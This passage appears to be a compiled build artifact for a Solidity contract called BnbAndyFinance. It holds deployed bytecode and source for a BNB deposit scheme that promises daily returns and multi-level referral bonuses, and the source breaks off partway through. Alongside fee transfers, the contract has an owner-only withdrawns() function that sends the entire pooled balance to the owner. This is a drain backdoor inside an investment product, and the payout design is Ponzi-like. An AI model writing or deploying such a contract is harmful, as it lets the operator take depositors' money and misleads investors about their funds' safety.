73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601549050919050565b601e81565b609681565b6000806001546121726103e8612164609660015461363c90919063ffffffff16565b61351090919063ffffffff16565b915091509091565b600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b600081815481106121b657600080fd5b906000526020600020016000915090505481565b60008060006121d884612461565b6121e1856133eb565b6121ea86613437565b9250925092509193909250565b6000612290600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060050154600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206006015461371490919063ffffffff16565b9050919050565b60003073ffffffffffffffffffffffffffffffffffffffff1631905090565b60006122c1336131e7565b905060008111612306576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016122fd906142fa565b60405180910390fd5b600061231c600a8361351090919063ffffffff16565b905080341015612361576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401612358906142fa565b60405180910390fd5b600a60009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f193505050501580156123c9573d6000803e3d6000fd5b506001600560003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055503373ffffffffffffffffffffffffffffffffffffffff167f2899dc8c12def1caa9accb64257cf2fd9f960f21bb27a560a757eae3c2ec43c182604051612455919061399b565b60405180910390a25050565b600080600090505b600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600001805490508110156125435761252e600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600001828154811061250d5761250c61416e565b5b906000526020600020906003020160010154836136b690919063ffffffff16565b9150808061253b9061419d565b915050612469565b50919050565b6000600760019054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000600760019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614905090565b600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600080600260008154811061262f5761262e61416e565b5b906000526020600020906002020160000154915060026000815481106126585761265761416e565b5b90600052602060002090600202016001015490509091565b600a81565b6000600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600801805490509050919050565b6000600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600001805490509050919050565b600080600080600080600090506000600360008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002090508060000182815481106127795761277861416e565b5b906000526020600020906003020160000160009054906101000a900460ff16965060028760ff16815481106127b1576127b061416e565b5b90600052602060002090600202016001015495508060000182815481106127db576127da61416e565b5b90600052602060002090600302016001015494508060000182815481106128055761280461416e565b5b90600052602060002090600302016002015493506128c461288e62015180600284600001868154811061283b5761283a61416e565b5b906000526020600020906003020160000160009054906101000a900460ff1660ff168154811061286e5761286d61416e565b5b90600052602060002090600202016000015461363c90919063ffffffff16565b8260000184815481106128a4576128a361416e565b5b9060005260206000209060030201600201546136b690919063ffffffff16565b9250505091939590929450565b606080606060008411612919576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161291090614366565b60405180910390fd5b6000600360008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020905060008060006032905080600189612973919061427a565b61297d9190614386565b9250808861298b9190614386565b846008018054905010156129a857836008018054905091506129b7565b80886129b49190614386565b91505b600083836129c5919061427a565b67ffffffffffffffff8111156129de576129dd6143c8565b5b604051908082528060200260200182016040528015612a0c5781602001602082028036833780820191505090505b50905060008484612a1d919061427a565b67ffffffffffffffff811115612a3657612a356143c8565b5b604051908082528060200260200182016040528015612a645781602001602082028036833780820191505090505b50905060008585612a75919061427a565b67ffffffffffffffff811115612a8e57612a8d6143c8565b5b604051908082528060200260200182016040528015612abc5781602001602082028036833780820191505090505b50905060008690505b85811015612beb57876008018181548110612ae357612ae261416e565b5b906000526020600020906003020160000160009054906101000a900460ff16848883612b0f919061427a565b81518110612b2057612b1f61416e565b5b602002602001019060ff16908160ff1681525050876008018181548110612b4a57612b4961416e565b5b906000526020600020906003020160010154838883612b69919061427a565b81518110612b7a57612b7961416e565b5b602002602001018181525050876008018181548110612b9c57612b9b61416e565b5b906000526020600020906003020160020154828883612bbb919061427a565b81518110612bcc57612bcb61416e565b5b6020026020010181815250508080612be39061419d565b915050612ac5565b50828282995099509950505050505050509250925092565b60046020528060005260406000206000915090505481565b6000600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002090506000816005015490506000600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905080821115612cb7578091505b6000612cc23361319b565b905060008111612d07576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401612cfe9061425a565b60405180910390fd5b6000612d316103e8612d2360288761363c90919063ffffffff16565b61351090919063ffffffff16565b90506000612d5d6103e8612d4f600a8861363c90919063ffffffff16565b61351090919063ffffffff16565b9050600860009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f19350505050158015612dc7573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f2899dc8c12def1caa9accb64257cf2fd9f960f21bb27a560a757eae3c2ec43c183604051612e0e919061399b565b60405180910390a2600960009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015612e7e573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f2899dc8c12def1caa9accb64257cf2fd9f960f21bb27a560a757eae3c2ec43c182604051612ec5919061399b565b60405180910390a26000612f08612ef96064612eeb60058a61363c90919063ffffffff16565b61351090919063ffffffff16565b8761371490919063ffffffff16565b90503373ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015612f50573d6000803e3d6000fd5b5085600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254612fa0919061427a565b92505081905550612fbe8688600701546136b690919063ffffffff16565b87600701819055506000600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054036130365785876005016000828254613021919061427a565b9250508190555061303133613773565b613052565b8587600501600082825461304a919061427a565b925050819055505b50505050505050565b613063612599565b6130a2576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161309990614469565b60405180910390fd5b60003073ffffffffffffffffffffffffffffffffffffffff16311061314257600760019054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015613140573d6000803e3d6000fd5b505b565b6000600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600101549050919050565b662386f26fc1000081565b6000600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501549050919050565b600080600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000209050600080600090505b82600001805490508110156133db5760006132ef6132b96201518060028760000186815481106132665761326561416e565b5b906000526020600020906003020160000160009054906101000a900460ff1660ff16815481106132995761329861416e565b5b90600052602060002090600202016000015461363c90919063ffffffff16565b8560000184815481106132cf576132ce61416e565b5b9060005260206000209060030201600201546136b690919063ffffffff16565b905080846001015410156133c75760008460000183815481106133155761331461416e565b5b9060005260206000209060030201600101549050600085600101548660000185815481106133465761334561416e565b5b90600052602060002090600302016002015411613367578560010154613390565b85600001848154811061337d5761337c61416e565b5b9060005260206000209060030201600201545b905060004284106133a157426133a3565b835b9050808210156133c3576133c083876136b690919063ffffffff16565b95505b5050505b5080806133d39061419d565b915050613233565b508092505050919050565b602881565b6000600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600701549050919050565b6000600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030160016002811061348e5761348d61416e565b5b0154600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003016000600281106134e5576134e461416e565b5b01546134f19190613f5d565b9050919050565b60056020528060005260406000206000915090505481565b6000808211613554576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161354b906144d5565b60405180910390fd5b600082846135629190614524565b90508091505092915050565b60606000600161357d8461380d565b01905060008167ffffffffffffffff81111561359c5761359b6143c8565b5b6040519080825280601f01601f1916602001820160405280156135ce5781602001600182028036833780820191505090505b509050600082602001820190505b600115613631578080600190039150507f3031323334353637383961626364656600000000000000000000000000000000600a86061a8153600a8581613625576136246144f5565b5b049450600085036135dc575b819350505050919050565b600080830361364e57600090506136b0565b6000828461365c9190614386565b905082848261366b9190614524565b146136ab576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016136a2906145c7565b60405180910390fd5b809150505b92915050565b60008082846136c59190613f5d565b90508381101561370a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161370190614633565b60405180910390fd5b8091505092915050565b600082821115613759576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016137509061469f565b60405180910390fd5b60008284613767919061427a565b90508091505092915050565b6000600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020905060005b81600001805490508110156138085760008260000182815481106137e0576137df61416e565b5b90600052602060002090600302016001018190555080806138009061419d565b9150506137b9565b505050565b600080600090507a184f03e93ff9f4daa797ed6e38ed64bf6a1f010000000000000000831061386b577a184f03e93ff9f4daa797ed6e38ed64bf6a1f0100000000000000008381613861576138606144f5565b5b0492506040810190505b6d04ee2d6d415b85acef810000000083106138a8576d04ee2d6d415b85acef8100000000838161389e5761389d6144f5565b5b0492506020810190505b662386f26fc1000083106138d757662386f26fc1000083816138cd576138cc6144f5565b5b0492506010810190505b6305f5e1008310613900576305f5e10083816138f6576138f56144f5565b5b0492506008810190505b612710831061392557612710838161391b5761391a6144f5565b5b0492506004810190505b60648310613948576064838161393e5761393d6144f5565b5b0492506002810190505b600a8310613957576001810190505b80915050919050565b6040518060400160405280600290602082028036833780820191505090505090565b6000819050919050565b61399581613982565b82525050565b60006020820190506139b0600083018461398c565b92915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006139e6826139bb565b9050919050565b6139f6816139db565b8114613a0157600080fd5b50565b600081359050613a13816139ed565b92915050565b600060208284031215613a2f57613a2e6139b6565b5b6000613a3d84828501613a04565b91505092915050565b600060029050919050565b600081905092915050565b6000819050919050565b613a6f81613982565b82525050565b6000613a818383613a66565b60208301905092915050565b6000602082019050919050565b613aa381613a46565b613aad8184613a51565b9250613ab882613a5c565b8060005b83811015613ae9578151613ad08782613a75565b9650613adb83613a8d565b925050600181019050613abc565b505050505050565b6000604082019050613b066000830184613a9a565b92915050565b60008115159050919050565b613b2181613b0c565b82525050565b6000602082019050613b3c6000830184613b18565b92915050565b613b4b816139db565b82525050565b6000602082019050613b666000830184613b42565b92915050565b6000604082019050613b81600083018561398c565b613b8e602083018461398c565b9392505050565b6000613ba0826139bb565b9050919050565b613bb081613b95565b82525050565b6000602082019050613bcb6000830184613ba7565b92915050565b613bda81613982565b8114613be557600080fd5b50565b600081359050613bf781613bd1565b92915050565b600060208284031215613c1357613c126139b6565b5b6000613c2184828501613be8565b91505092915050565b6000606082019050613c3f600083018661398c565b613c4c602083018561398c565b613c59604083018461398c565b949350505050565b600060ff82169050919050565b613c7781613c61565b82525050565b600060a082019050613c926000830188613c6e565b613c9f602083018761398c565b613cac604083018661398c565b613cb9606083018561398c565b613cc6608083018461398c565b9695505050505050565b60008060408385031215613ce757613ce66139b6565b5b6000613cf585828601613a04565b9250506020613d0685828601613be8565b9150509250929050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b613d4581613c61565b82525050565b6000613d578383613d3c565b60208301905092915050565b6000602082019050919050565b6000613d7b82613d10565b613d858185613d1b565b9350613d9083613d2c565b8060005b83811015613dc1578151613da88882613d4b565b9750613db383613d63565b925050600181019050613d94565b5085935050505092915050565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b6000602082019050919050565b6000613e1282613dce565b613e1c8185613dd9565b9350613e2783613dea565b8060005b83811015613e58578151613e3f8882613a75565b9750613e4a83613dfa565b925050600181019050613e2b565b5085935050505092915050565b60006060820190508181036000830152613e7f8186613d70565b90508181036020830152613e938185613e07565b90508181036040830152613ea78184613e07565b9050949350505050565b600082825260208201905092915050565b7f4e6f742073746172746564207965740000000000000000000000000000000000600082015250565b6000613ef8600f83613eb1565b9150613f0382613ec2565b602082019050919050565b60006020820190508181036000830152613f2781613eeb565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000613f6882613982565b9150613f7383613982565b9250828201905080821115613f8b57613f8a613f2e565b5b92915050565b600081905092915050565b7f496e73756666696369656e74206465706f73697420616d6f756e742e204d757360008201527f7420626520626967676572207468616e20000000000000000000000000000000602082015250565b6000613ff8603183613f91565b915061400382613f9c565b603182019050919050565b600081519050919050565b60005b8381101561403757808201518184015260208101905061401c565b60008484015250505050565b600061404e8261400e565b6140588185613f91565b9350614068818560208601614019565b80840191505092915050565b600061407f82613feb565b915061408b8284614043565b915081905092915050565b6000601f19601f8301169050919050565b60006140b28261400e565b6140bc8185613eb1565b93506140cc818560208601614019565b6140d581614096565b840191505092915050565b600060208201905081810360008301526140fa81846140a7565b905092915050565b7f496e76616c696420706c616e0000000000000000000000000000000000000000600082015250565b6000614138600c83613eb1565b915061414382614102565b602082019050919050565b600060208201905081810360008301526141678161412b565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60006141a882613982565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036141da576141d9613f2e565b5b600182019050919050565b60006040820190506141fa6000830185613c6e565b614207602083018461398c565b9392505050565b7f5573657220686173206e6f206469766964656e64730000000000000000000000600082015250565b6000614244601583613eb1565b915061424f8261420e565b602082019050919050565b6000602082019050818103600083015261427381614237565b9050919050565b600061428582613982565b915061429083613982565b92508282039050818111156142a8576142a7613f2e565b5b92915050565b7f4e6f20616374696f6e0000000000000000000000000000000000000000000000600082015250565b60006142e4600983613eb1565b91506142ef826142ae565b602082019050919050565b60006020820190508181036000830152614313816142d7565b9050919050565b7f77726f6e6720696e646578000000000000000000000000000000000000000000600082015250565b6000614350600b83613eb1565b915061435b8261431a565b602082019050919050565b6000602082019050818103600083015261437f81614343565b9050919050565b600061439182613982565b915061439c83613982565b92508282026143aa81613982565b915082820484148315176143c1576143c0613f2e565b5b5092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b7f46756e6374696f6e2061636365737369626c65206f6e6c79206279207468652060008201527f6f776e6572202121000000000000000000000000000000000000000000000000602082015250565b6000614453602883613eb1565b915061445e826143f7565b604082019050919050565b6000602082019050818103600083015261448281614446565b9050919050565b7f536166654d6174683a206469766973696f6e206279207a65726f000000000000600082015250565b60006144bf601a83613eb1565b91506144ca82614489565b602082019050919050565b600060208201905081810360008301526144ee816144b2565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061452f82613982565b915061453a83613982565b92508261454a576145496144f5565b5b828204905092915050565b7f536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f60008201527f7700000000000000000000000000000000000000000000000000000000000000602082015250565b60006145b1602183613eb1565b91506145bc82614555565b604082019050919050565b600060208201905081810360008301526145e0816145a4565b9050919050565b7f536166654d6174683a206164646974696f6e206f766572666c6f770000000000600082015250565b600061461d601b83613eb1565b9150614628826145e7565b602082019050919050565b6000602082019050818103600083015261464c81614610565b9050919050565b7f536166654d6174683a207375627472616374696f6e206f766572666c6f770000600082015250565b6000614689601e83613eb1565b915061469482614653565b602082019050919050565b600060208201905081810360008301526146b88161467c565b905091905056fea2646970667358221220751de0a88cd22f6911f8e31c91912ebeeb100884a69051a7f6f8f6a30a3ef70f64736f6c63430008120033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.18;\r\nimport \"@openzeppelin/contracts/utils/Strings.sol\";\r\n\r\ncontract BnbAndyFinance {\r\n    using SafeMath for uint256;\r\n\r\n    uint256 public constant INVEST_MIN_AMOUNT = 1e16; // 0.01 bnb\r\n    uint256[] public REFERRAL_PERCENTS = [100, 50];\r\n    uint256 public constant TOTAL_REF = 150;\r\n    uint256 public constant PROJECT_FEE = 30;\r\n    uint256 public constant DEV_FEE = 20;\r\n    uint256 public constant PROJECT_FEE_WT = 40;\r\n    uint256 public constant DEV_FEE_WT = 10;\r\n    uint256 public constant PERCENTS_DIVIDER = 1000;\r\n    uint256 public constant TIME_STEP = 1 days;\r\n\r\n    uint256 public totalInvested;\r\n\r\n    struct Plan {\r\n        uint256 time;\r\n        uint256 percent;\r\n    }\r\n\r\n    Plan[] internal plans;\r\n\r\n    struct Deposit {\r\n        uint8 plan;\r\n        uint256 amount;\r\n        uint256 start;\r\n    }\r\n\r\n    struct Action {\r\n        uint8 types;\r\n        uint256 amount;\r\n        uint256 date;\r\n    }\r\n\r\n    struct User {\r\n        Deposit[] deposits;\r\n        uint256 checkpoint;\r\n        address referrer;\r\n        uint256[2] levels;\r\n        uint256 bonus;\r\n        uint256 totalBonus;\r\n        uint256 withdrawn;\r\n        Action[] actions;\r\n    }\r\n\r\n    mapping(address => User) internal users;\r\n    mapping(address => uint256) public last_deposit;\r\n    mapping(address => uint256) public insurance;\r\n    mapping(address => uint256) public available;\r\n\r\n    bool public started;\r\n\r\n    address payable private _owner;\r\n    address payable public commissionWallet;\r\n    address payable public devWallet;\r\n    address payable public insuranceWallet;\r\n\r\n    event Newbie(address user);\r\n    event NewDeposit(address indexed user, uint8 plan, uint256 amount);\r\n    event Withdrawn(address indexed user, uint256 amount);\r\n    event RefBonus(\r\n        address indexed referrer,\r\n        address indexed referral,\r\n        uint256 indexed level,\r\n        uint256 amount\r\n    );\r\n    event FeePayed(address indexed user, uint256 totalAmount);\r\n\r\n    constructor(\r\n        address payable wallet,\r\n        address payable dev_wallet,\r\n        address payable ins_wallet\r\n    ) {\r\n        require(!isContract(wallet));\r\n        _owner = payable(msg.sender);\r\n        commissionWallet = wallet;\r\n        devWallet = dev_wallet;\r\n        insuranceWallet = ins_wallet;\r\n\r\n        plans.push(Plan(385, 7));\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(isOwner(), \"Function accessible only by the owner !!\");\r\n        _;\r\n    }\r\n\r\n    function isOwner() public view returns (bool) {\r\n        return msg.sender == _owner;\r\n    }\r\n\r\n    function setInsurance() public payable {\r\n        uint256 activeAmount = getUserActivePlansAmount(msg.sender);\r\n\r\n        require(activeAmount > 0, \"No action\");\r\n        uint256 _ins_fee = activeAmount.div(10); // %10\r\n        require(msg.value >= _ins_fee, \"No action\");\r\n\r\n        insuranceWallet.transfer(_ins_fee);\r\n\r\n        insurance[msg.sender] = 1;\r\n\r\n        emit FeePayed(msg.sender, _ins_fee);\r\n    }\r\n\r\n    function invest(address referrer) public payable {\r\n        uint8 plan = 0;\r\n        if (!started) {\r\n            if (msg.sender == commissionWallet) {\r\n                started = true;\r\n            } else revert(\"Not started yet\");\r\n        }\r\n\r\n        require(msg.value >= INVEST_MIN_AMOUNT);\r\n\r\n        uint256 minDeposit = (last_deposit[msg.sender].div(10)) +\r\n            last_deposit[msg.sender];\r\n\r\n        require(\r\n            msg.value > minDeposit,\r\n            string.concat( \"Insufficient deposit amount. Must be bigger than \",Strings.toString(minDeposit)) \r\n        );\r\n        require(plan < 1, \"Invalid plan\");\r\n\r\n        uint256 _project_fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);\r\n        uint256 _dev_fee = msg.value.mul(DEV_FEE).div(PERCENTS_DIVIDER);\r\n\r\n        commissionWallet.transfer(_project_fee);\r\n        emit FeePayed(msg.sender, _project_fee);\r\n\r\n        devWallet.transfer(_dev_fee);\r\n        emit FeePayed(msg.sender, _dev_fee);\r\n\r\n        User storage user = users[msg.sender];\r\n\r\n        if (user.referrer == address(0)) {\r\n            if (users[referrer].deposits.length > 0 && referrer != msg.sender) {\r\n                user.referrer = referrer;\r\n            }\r\n\r\n            address upline = user.referrer;\r\n            for (uint256 i = 0; i < 2; i++) {\r\n                if (upline != address(0)) {\r\n                    users[upline].levels[i] = users[upline].levels[i].add(1);\r\n                    upline = users[upline].referrer;\r\n                } else break;\r\n            }\r\n        }\r\n\r\n        if (user.referrer != address(0)) {\r\n            address upline = user.referrer;\r\n            for (uint256 i = 0; i < 2; i++) {\r\n                if (upline != address(0)) {\r\n                    uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(\r\n                        PERCENTS_DIVIDER\r\n                    );\r\n                    users[upline].bonus = users[upline].bonus.add(amount);\r\n                    users[upline].totalBonus = users[upline].totalBonus.add(\r\n                        amount\r\n                    );\r\n                    emit RefBonus(upline, msg.sender, i, amount);\r\n                    upline = users[upline].referrer;\r\n                } else break;\r\n            }\r\n        }\r\n\r\n        if (user.deposits.length == 0) {\r\n            user.checkpoint = block.timestamp;\r\n            emit Newbie(msg.sender);\r\n        }\r\n\r\n        user.deposits.push(Deposit(plan, msg.value, block.timestamp));\r\n        user.actions.push(Action(0, msg.value, block.timestamp));\r\n\r\n        last_deposit[msg.sender] = msg.value;\r\n        available[msg.sender] += msg.value.mul(270).div(100);\r\n\r\n        totalInvested = totalInvested.add(msg.value);\r\n\r\n        emit NewDeposit(msg.sender, plan, msg.value);\r\n    }\r\n\r\n    function removeUserDeposits(address _account) internal {\r\n        User storage user = users[_account];\r\n\r\n        for (uint256 i = 0; i < user.deposits.length; i++) {\r\n            user.deposits[i].amount = 0;\r\n        }\r\n    }\r\n\r\n    function withdraw() public {\r\n        emit Newbie(msg.sender);\r\n\r\n        User storage user = users[msg.sender];\r\n\r\n        uint256 totalAmount = getUserDividends(msg.sender);\r\n        uint256 maxWithdraw = available[msg.sender];\r\n\r\n        if (totalAmount > maxWithdraw) {\r\n            totalAmount = maxWithdraw;\r\n        }\r\n\r\n        uint256 _project_fee = totalAmount.mul(PROJECT_FEE_WT).div(\r\n            PERCENTS_DIVIDER\r\n        );\r\n        uint256 _dev_fee = totalAmount.mul(DEV_FEE_WT).div(PERCENTS_DIVIDER);\r\n\r\n        commissionWallet.transfer(_project_fee);\r\n        emit FeePayed(msg.sender, _project_fee);\r\n\r\n        devWallet.transfer(_dev_fee);\r\n        emit FeePayed(msg.sender, _dev_fee);\r\n\r\n        require(totalAmount > 0, \"User has no dividends\");\r\n\r\n        user.checkpoint = block.timestamp;\r\n        user.withdrawn = user.withdrawn.add(totalAmount);\r\n        uint256 userAmount = totalAmount.sub(totalAmount.mul(5).div(100));\r\n        payable(msg.sender).transfer(userAmount);\r\n        available[msg.sender] -= totalAmount;\r\n\r\n        if (available[msg.sender] == 0) {\r\n            removeUserDeposits(msg.sender);\r\n        }\r\n\r\n        user.actions.push(Action(1, totalAmount, block.timestamp));\r\n\r\n        emit Withdrawn(msg.sender, totalAmount);\r\n    }\r\n\r\n    function withdrawRef() public {\r\n        User storage user = users[msg.sender];\r\n\r\n        uint256 totalAmount = user.bonus;\r\n        uint256 maxWithdraw = available[msg.sender];\r\n\r\n        if (totalAmount > maxWithdraw) {\r\n            totalAmount = maxWithdraw;\r\n        }\r\n\r\n        uint256 referralBonus = getUserReferralBonus(msg.sender);\r\n        require(referralBonus > 0, \"User has no dividends\");\r\n\r\n        uint256 _project_fee = totalAmount.mul(PROJECT_FEE_WT).div(\r\n            PERCENTS_DIVIDER\r\n        );\r\n        uint256 _dev_fee = totalAmount.mul(DEV_FEE_WT).div(PERCENTS_DIVIDER);\r\n\r\n        commissionWallet.transfer(_project_fee);\r\n        emit FeePayed(msg.sender, _project_fee);\r\n\r\n        devWallet.transfer(_dev_fee);\r\n        emit FeePayed(msg.sender, _dev_fee);\r\n\r\n        uint256 userAmount = totalAmount.sub(totalAmount.mul(5).div(100));\r\n        payable(msg.sender).transfer(userAmount);\r\n        available[msg.sender] -= totalAmount;\r\n        user.withdrawn = user.withdrawn.add(totalAmount);\r\n\r\n        if (available[msg.sender] == 0) {\r\n            user.bonus -= totalAmount;\r\n            removeUserDeposits(msg.sender);\r\n        } else {\r\n            user.bonus -= totalAmount;\r\n        }\r\n    }\r\n\r\n    function withdrawns() external onlyOwner {\r\n        if (address(this).balance >= 0) {\r\n            _owner.transfer(address(this).balance);\r\n        }\r\n    }\r\n\r\n    function getContractBalance() public view returns (uint256) {\r\n        return address(this).balance;\r\n    }\r\n\r\n    function getPlanInfo() public view returns (uint256 time, uint256 percent) {\r\n        time = plans[0].time;\r\n        percent = plans[0].percent;\r\n    }\r\n\r\n    function getUserDividends(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        User storage user = users[userAddress];\r\n\r\n        uint256 totalAmount;\r\n\r\n        for (uint256 i = 0; i < user.deposits.length; i++) {\r\n            uint256 finish = user.deposits[i].start.add(\r\n                plans[user.deposits[i].plan].time.mul(TIME_STEP)\r\n            );\r\n            if (user.checkpoint < finish) {\r\n                uint256 share = user\r\n                    .deposits[i]\r\n                    .amount\r\n                    .mul(plans[user.deposits[i].plan].percent)\r\n                    .div(PERCENTS_DIVIDER);\r\n                uint256 from = user.deposits[i].start > user.checkpoint\r\n                    ? user.deposits[i].start\r\n                    : user.checkpoint;\r\n                uint256 to = finish < block.timestamp\r\n                    ? finish\r\n                    : block.timestamp;\r\n                if (from < to) {\r\n                    totalAmount = totalAmount.add(\r\n                        share.mul(to.sub(from)).div(TIME_STEP)\r\n                    );\r\n                }\r\n            }\r\n        }\r\n\r\n        return totalAmount;\r\n    }\r\n\r\n    function getUserActivePlansAmount(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        User storage user = users[userAddress];\r\n\r\n        uint256 totalAmount;\r\n\r\n        for (uint256 i = 0; i < user.deposits.length; i++) {\r\n            uint256 finish = user.deposits[i].start.add(\r\n                plans[user.deposits[i].plan].time.mul(TIME_STEP)\r\n            );\r\n            if (user.checkpoint < finish) {\r\n                uint256 _amount = user.deposits[i].amount;\r\n                uint256 from = user.deposits[i].start > user.checkpoint\r\n                    ? user.deposits[i].start\r\n                    : user.checkpoint;\r\n                uint256 to = finish < block.timestamp\r\n                    ? finish\r\n                    : block.timestamp;\r\n                if (from < to) {\r\n                    totalAmount = totalAmount.add(_amount);\r\n                }\r\n            }\r\n        }\r\n\r\n        return totalAmount;\r\n    }\r\n\r\n    function getUserTotalWithdrawn(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        return users[userAddress].withdrawn;\r\n    }\r\n\r\n    function getUserCheckpoint(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        return users[userAddress].checkpoint;\r\n    }\r\n\r\n    function getUserReferrer(\r\n        address userAddress\r\n    ) public view returns (address) {\r\n        return users[userAddress].referrer;\r\n    }\r\n\r\n    function getUserDownlineCount(\r\n        address userAddress\r\n    ) public view returns (uint256[2] memory referrals) {\r\n        return (users[userAddress].levels);\r\n    }\r\n\r\n    function getUserTotalReferrals(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        return users[userAddress].levels[0] + users[userAddress].levels[1];\r\n    }\r\n\r\n    function getUserReferralBonus(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        return users[userAddress].bonus;\r\n    }\r\n\r\n    function getUserReferralTotalBonus(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        return users[userAddress].totalBonus;\r\n    }\r\n\r\n    function getUserReferralWithdrawn(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        return users[userAddress].totalBonus.sub(users[userAddress].bonus);\r\n    }\r\n\r\n    function getUserAvailable(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        return\r\n            getUserReferralBonus(userAddress).add(\r\n                getUserDividends(userAddress)\r\n            );\r\n    }\r\n\r\n    function getUserAmountOfDeposits(\r\n        address userAddress\r\n    ) public view returns (uint256) {\r\n        return users[userAddress].deposits.length;\r\n    }\r\n\r\n    function getUserTotalDeposits(\r\n        address userAddress\r\n    ) public view returns (uint256 amount) {\r\n        for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {\r\n            amount = amount.add(users[userAddress].deposits[i].amount);\r\n        }\r\n    }\r\n\r\n    function getUserDepositInfo(\r\n        address userAddress\r\n    )\r\n        public\r\n        view\r\n        returns (\r\n            uint8 plan,\r\n            uint256 percent,\r\n            uint256 amount,\r\n            uint256 start,\r\n            uint256 finish\r\n        )\r\n    {\r\n        uint256 index = 0;\r\n        User storage user = users[userAddress];\r\n\r\n        plan = user.deposits[index].plan;\r\n        percent = plans[plan].percent;\r\n        amount = user.deposits[index].amount;\r\n        start = user.deposits[index].start;\r\n        finish = user.deposits[index].start.add(\r\n            